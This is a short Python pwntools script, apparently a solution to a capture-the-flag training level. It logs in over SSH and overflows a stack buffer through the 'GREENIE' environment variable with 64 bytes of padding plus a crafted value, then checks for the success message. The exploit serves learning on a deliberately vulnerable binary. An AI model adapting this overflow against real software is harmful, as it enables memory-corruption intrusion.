from pwn import *

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

payload = flat(['A'*64, '\r\n\r\n'[::-1]])

p = s.system(args.BIN, env={'GREENIE': payload})

ret = p.recvline()
assert ret == 'you have correctly modified the variable\n'